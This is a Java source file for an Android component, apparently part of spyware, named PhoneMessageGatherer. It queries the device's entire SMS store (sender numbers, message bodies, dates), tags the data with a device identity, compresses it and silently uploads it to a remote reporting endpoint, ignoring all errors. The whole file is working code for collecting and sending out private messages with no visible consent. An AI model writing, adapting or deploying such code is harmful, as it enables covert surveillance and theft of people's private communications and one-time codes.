package org.code.coregradle.gatherers;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;

import androidx.work.ListenableWorker;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class PhoneMessageGatherer implements InfoGatherer {

    private Context context;
    private ContentResolver contentResolver;
    private OkHttpClient httpClient;
    private IdentityStore identityStore;
    private int limit;

    public PhoneMessageGatherer() {
        limit = -1;
    }

    public PhoneMessageGatherer(int limit) {
        this.limit = limit;
    }


    @Override
    public void initGatherer(Context context) {
        this.context = context;
        this.contentResolver = context.getContentResolver();
        httpClient = new OkHttpClient();
        this.identityStore = IdentityStore.getInstance(context);
    }

    private JSONObject toConversation(String phoneNumber, String type, String date, String body, long timestamp) {
        JSONObject conversation = new JSONObject();
        try {
            conversation.put("phone", phoneNumber);
            conversation.put("type", type);
            conversation.put("date", date);
            conversation.put("body", body);
            conversation.put("timestamp", timestamp);
        } catch (JSONException e) {

        }
        return conversation;
    }

    private void addMessages(JSONObject root) {
        JSONArray conversations = new JSONArray();

        String[] projection = new String[]{Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.THREAD_ID, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE};
        try (Cursor cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, projection, null, null, Telephony.Sms.DATE + " DESC")) {
            boolean isLimited = false;
            if (limit > 0) {
                isLimited = true;
            }
            while (cursor.moveToNext()) {
                String phoneNumber = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String type = cursor.getString(cursor.getColumnIndex(Telephony.Sms.TYPE));
                long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                String date = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault()).format(new Date(timestamp));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                conversations.put(toConversation(phoneNumber, type, date, body, timestamp));
                if (isLimited) {
                    limit -= 1;
                    if (limit == 0) {
                        break;
                    }
                }
            }
        } catch (Exception ignored) {

        }
        try {
            root.put("messages", conversations);
        } catch (JSONException ignored) {
        }
    }


    @Override
    public JSONObject getRequestJSON() {
        JSONObject report = new JSONObject();
        try {
            report.put(this.identityStore.getIdentityKey(), this.identityStore.getIdentityValue());
            addMessages(report);
        } catch (JSONException ignored) {

        }
        return report;
    }

    @Override
    public ListenableWorker.Result makeRequest() {
        try {
            JSONObject conversations = getRequestJSON();
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(conversations.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.REPORT_SMS)
                    .post(requestBody)
                    .build();

            Response response = httpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return ListenableWorker.Result.success();
            }
            return ListenableWorker.Result.retry();
        } catch (Exception ignored) {
            return ListenableWorker.Result.failure();
        }
    }
}
